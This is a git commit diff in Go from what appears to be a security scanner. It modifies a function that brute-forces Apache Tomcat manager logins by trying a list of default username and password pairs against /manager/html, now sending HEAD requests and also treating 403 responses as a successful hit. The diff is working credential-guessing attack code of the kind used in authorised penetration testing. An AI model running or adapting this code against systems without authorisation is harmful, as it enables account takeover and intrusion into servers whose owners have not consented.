48adf2acf8b3f3e9ce7e3c3aba455dadf8618259
veo <38176360+veo@users.noreply.github.com>
2021-07-13 15:09:32 +0800

    优化 fuzz

--- pkg/brute/tomcat_brute.go
+++ pkg/brute/tomcat_brute.go
@@ -3,11 +3,11 @@ package brute
 import "fmt"
 
 func Tomcat_brute(url string) (username string, password string) {
-	if req, err := httpRequsetBasic("", "", url+"/manager/html", "GET", ""); err == nil {
+	if req, err := httpRequsetBasic("", "", url+"/manager/html", "HEAD", ""); err == nil {
 		if req.StatusCode == 401 {
 			for uspa := range tomcatuserpass {
-				if req2, err2 := httpRequsetBasic(tomcatuserpass[uspa].username, tomcatuserpass[uspa].password, url+"/manager/html", "GET", ""); err2 == nil {
-					if req2.StatusCode == 200 {
+				if req2, err2 := httpRequsetBasic(tomcatuserpass[uspa].username, tomcatuserpass[uspa].password, url+"/manager/html", "HEAD", ""); err2 == nil {
+					if req2.StatusCode == 200 || req2.StatusCode == 403 {
 						fmt.Printf("tomcat-brute-sucess|%s:%s--%s", tomcatuserpass[uspa].username, tomcatuserpass[uspa].password, url)
 						fmt.Println()
 						return tomcatuserpass[uspa].username, tomcatuserpass[uspa].password
